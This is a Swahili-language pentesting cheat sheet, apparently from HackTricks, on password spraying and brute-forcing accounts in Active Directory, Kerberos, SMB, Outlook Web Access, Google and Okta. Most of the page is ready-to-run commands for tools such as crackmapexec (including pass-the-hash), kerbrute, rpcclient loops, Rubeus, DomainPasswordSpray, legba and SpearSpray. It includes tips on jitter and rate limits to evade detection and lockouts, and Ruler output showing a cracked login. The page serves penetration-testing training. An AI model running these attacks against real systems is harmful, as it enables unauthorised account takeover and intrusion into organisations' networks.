# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Mara tu unapopata **valid usernames** kadhaa unaweza kujaribu **common passwords** zinazotumika zaidi (kumbuka password policy ya mazingira) kwa kila mtumiaji uliyegundua.\
Kwa chaguo-msingi, **minimum** **password** **length** ni **7**.

Orodha za common usernames zinaweza pia kuwa muhimu: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Kumbuka kwamba unaweza **could lockout some accounts if you try several wrong passwords** (kwa chaguo-msingi zaidi ya 10).

### Pata password policy

Ikiwa una user credentials au shell kama domain user unaweza **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation kutoka Linux (au zote)

- Kutumia **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Kutumia [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(unaweza kubainisha idadi ya jaribio ili kuepuka lockouts):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Kutumia [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - HAIPENDEKEZWI, WAKATI MENGINE HAIFANYI KAZI
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Kwa kutumia moduli ya `scanner/smb/smb_login` ya **Metasploit**:

![](<../../images/image (745).png>)

- Kutumia **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Kutoka Windows

- Na [Rubeus](https://github.com/Zer1t0/Rubeus) toleo lenye brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Kwa kutumia [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Inaweza kuunda watumiaji kutoka kwa domain kwa chaguo-msingi na itapata sera ya nywila kutoka kwa domain na kuweka kikomo kwa majaribio kulingana nayo):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Kwa kutumia [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying na LDAP targeting na PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying hupunguza kelele ikilinganishwa na majaribio ya kuunga SMB/NTLM/LDAP na inalingana vizuri zaidi na sera za kufunga akaunti za AD. SpearSpray inachanganya LDAP-driven targeting, injini ya pattern, na ufahamu wa sera (domain policy + PSOs + badPwdCount buffer) ili kuspray kwa usahihi na kwa usalama. Pia inaweza kuweka lebo kwa principals walioathiriwa kwenye Neo4j kwa ajili ya BloodHound pathing.

Mawazo muhimu:
- Ugundaji wa watumiaji kupitia LDAP na paging na msaada wa LDAPS, kwa hiari kutumia vichujio vya LDAP vilivyobinafsishwa.
- Sera ya kufunga akaunti ya domain + kuchuja kwa kuzingatia PSO ili kuacha buffer ya majaribio inayoweza kusanidiwa (threshold) na kuepuka kufunga watumiaji.
- Thibitisho la Kerberos pre-auth likitumia fast gssapi bindings (huunda 4768/4771 kwenye DCs badala ya 4625).
- Uundaji wa nywila unaotegemea pattern, kwa kila mtumiaji kwa kutumia vigezo kama majina na thamani za muda zinazotokana na pwdLastSet ya kila mtumiaji.
- Udhibiti wa throughput kwa kutumia threads, jitter, na max requests per second.
- Uunganishaji wa hiari na Neo4j kuorodhesha watumiaji waliotekwa kwa BloodHound.

Matumizi ya msingi na ugundaji:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Kulenga na udhibiti wa mtindo:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Udhibiti wa kuficha na usalama:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Kuongeza taarifa kwa Neo4j/BloodHound:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Muhtasari wa mfumo wa pattern (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Vigezo vinavyopatikana ni pamoja na:
- {name}, {samaccountname}
- Muda kutoka kwa pwdLastSet ya kila mtumiaji (au whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Msaidizi wa muundo na tokeni ya shirika: {separator}, {suffix}, {extra}

Vidokezo vya uendeshaji:
- Pendelea kuchunguza PDC-emulator kwa kutumia -dc ili kusoma badPwdCount na taarifa zinazohusiana na sera zilizo na mamlaka zaidi.
- Urejeshaji wa badPwdCount unachochewa kwenye jaribio lijalo baada ya dirisha la uchunguzi; tumia kikomo na upangaji wa muda ili kukaa salama.
- Jaribio za Kerberos pre-auth zinaonekana kama 4768/4771 katika DC telemetry; tumia jitter na rate-limiting ili kujichanganya.

> Vidokezo: Vipimo vya ukurasa wa LDAP vya chaguo-msingi vya SpearSpray ni 200; rekebisha kwa -lps inapobidi.

## Outlook Web Access

Kuna zana kadhaa za p**assword spraying outlook**.

- Kwa [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- kwa [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Kwa [Ruler](https://github.com/sensepost/ruler) (inayotegemewa!)
- Kwa [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Kwa [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Ili kutumia mojawapo ya zana hizi, unahitaji orodha ya watumiaji na password / orodha ndogo ya passwords to spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Marejeleo

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)


{{#include ../../banners/hacktricks-training.md}}
